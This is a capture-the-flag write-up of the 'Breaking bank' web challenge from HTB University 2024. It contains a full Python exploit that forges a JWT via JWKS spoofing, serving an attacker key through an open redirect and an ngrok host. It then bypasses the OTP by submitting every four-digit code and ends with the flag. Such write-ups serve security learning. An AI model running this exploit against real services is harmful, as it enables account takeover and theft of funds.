---
title: HTB University 2024 Binary badlands
published: 2024-12-17
description: "Writeup for web category of HTB University 2024: Binary badlands"
image: "./cover.jpeg"
tags: ["2024"]
category: Web
draft: false
---

## Breaking bank
![Screenshot 2024-12-17 215158](https://hackmd.io/_uploads/rJIQgfJr1x.png)

How to get flag: Steal all money in account ```financial-controller@frontier-board.htb```:
![Screenshot 2024-12-17 215407](https://hackmd.io/_uploads/rJW0gMySkx.png)
![Screenshot 2024-12-17 215641](https://hackmd.io/_uploads/rJINZGkSyx.png)

How to attack: Login in this account, then bypass otp to transper money.

Firstly, create a crendential with username: `fake@gmail.com` and password: `123`

![Screenshot 2024-12-17 220013](https://hackmd.io/_uploads/rJcbfMyS1l.png)

Time to steal money :v

In source code we have three hint:

- Hint 1: 
![Screenshot 2024-12-17 220201](https://hackmd.io/_uploads/BkBdfGkS1l.png)
- Hint 2:
![Screenshot 2024-12-17 220228](https://hackmd.io/_uploads/BJ-czGJBJg.png)
- Hint 3:
![Screenshot 2024-12-17 220252](https://hackmd.io/_uploads/S1uoMMyBkl.png)

### Hint 1:
![Screenshot 2024-12-17 220558](https://hackmd.io/_uploads/HkRPQf1r1l.png)

This is a redirect endpoint, what should i do with this...

### Hint 2:
![Screenshot 2024-12-17 221101](https://hackmd.io/_uploads/HJNsEGyBJl.png)

After asking many people,i have a conclusion that the vuln is JWKS Spoofing

Link: `https://0xdf.gitlab.io/2022/05/07/htb-unicode.html`

JWKS is JWT but use key to sign

In endpoint `/.well-known/jwks.json`, we have basic structure of jku.
![Screenshot 2024-12-17 222605](https://hackmd.io/_uploads/r1iM_Gkryx.png)

| Attribute    | Purpose                        |       
|--------------|--------------------------------|
|    `alg`     | Algorithm of jwt               |
| `   kty`     | Algorithm to create key        |
|    `use`     | Purpose of key, sig is signing |
|    `kid`     | Key identifier                 |
|    `n, e`     | Two component of RSA            |

:::important[Conclusion]
If jku change, the key of this will change.
:::

With that conclusion and this link above, i used chatgpt to create a python code to create key, make it become a web which is the same with `/.well-known/jwks.json`

:::note
Before run this code, change parameter `kid` in code with parameter `with` in endpoint `/.well-known/jwks.json`
:::

### Code exploit:

```python
import jwt
import json
import base64
from datetime import datetime
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from flask import Flask, jsonify

kid = "86147695-417b-46c7-85e7-1d71ef49562a"
redirect_url="https://8178-113-185-52-248.ngrok-free.app"
target_email="financial-controller@frontier-board.htb"

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()


private_key_pem = private_key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)


header = {
    "typ": "JWT",
    "kid": kid,
    "jku": f"http://127.0.0.1:1337/api/analytics/redirect?ref=cta-announcement&url={redirect_url}"
}

payload = {
    "email": target_email,
    "iat": int(datetime.now().timestamp())
}


jwt_token = jwt.encode(
    payload,
    private_key_pem,
    algorithm="RS256",
    headers=header
)


public_numbers = public_key.public_numbers()

def int_to_base64(num)
    return base64.urlsafe_b64encode(num.to_bytes((num.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()

key = {
    "kty": "RSA",
    "n": int_to_base64(public_numbers.n),
    "e": int_to_base64(public_numbers.e),
    "alg": "RS256",
    "use": "sig",
    "kid": kid
}
jwks = {"keys": [key]}

with open("private.pem", "w") as f:
    f.write(private_key_pem.decode())

with open("public.pem", "w") as f:
    f.write(public_key_pem.decode())

print("Generated JWT:")
print(jwt_token)

app = Flask(__name__)

@app.route('/', methods=['GET'])
def serve_jwks():
    return jsonify(jwks)

if __name__ == '__main__':
    print("Serving JWKS at http://127.0.0.1:5000/")
    app.run(host='0.0.0.0', port=5000)
```

Using ngrok with command `ngrok http 5000`
![Screenshot 2024-12-17 224527](https://hackmd.io/_uploads/HkSinMJB1g.png)

After that, run the python code, and you will get a jwt:

![Screenshot 2024-12-17 224845](https://hackmd.io/_uploads/SJcDpG1rJl.png)

In ngrok website: 

![Screenshot 2024-12-17 224949](https://hackmd.io/_uploads/Sy5s6z1H1x.png)

This is the fake key, now it time to check

![Screenshot 2024-12-17 225501](https://hackmd.io/_uploads/HkfkJ7JB1g.png)

It actually work!!!!

![Screenshot 2024-12-17 225628](https://hackmd.io/_uploads/ryt41QyB1l.png)

Refresh and

![Screenshot 2024-12-17 225735](https://hackmd.io/_uploads/Hyk9kXySyg.png)

Bro why are you too rich 

Because this web only allow friends to transper money, we need to add fake nick as friend
![Screenshot 2024-12-17 225915](https://hackmd.io/_uploads/HkJygQkHye.png)

Accept in fake nick

![Screenshot 2024-12-17 225957](https://hackmd.io/_uploads/HyKGgmkrJe.png)

Now we can transper money

![Screenshot 2024-12-17 230046](https://hackmd.io/_uploads/HyHUemySkl.png)

Enter `available balance` value to drain his money 
![Screenshot 2024-12-17 230204](https://hackmd.io/_uploads/HJy9eQkBye.png)

Oh no OTP. I need to use burp suite
![Screenshot 2024-12-17 230319](https://hackmd.io/_uploads/S1zlWQyB1g.png)

How can bypass this now? It time to use hint number three

### Bypass otp

Chatgpt is too string :v.I used chatgpt to write a python code to create a file which contain a list from 0000 to 9999 

```python=
import json

numbers = [f'{i:04}' for i in range(10000)]

with open('numbers.txt', 'w') as f:
    json.dump(numbers, f)
```
Run this code, then enter the list to `otp` parameter:

![Screenshot 2024-12-17 230751](https://hackmd.io/_uploads/S16JG7kBkl.png)

Access api/dashboard and restart

![Screenshot 2024-12-17 230855](https://hackmd.io/_uploads/ryz7M71Hkl.png)

GG

### Flag: 
`
HTB{rugg3d_pu11ed_c0nqu3r3d_d14m0nd_h4nd5_b6128c123229cf8b3e0eb8c8b27a388c}
`
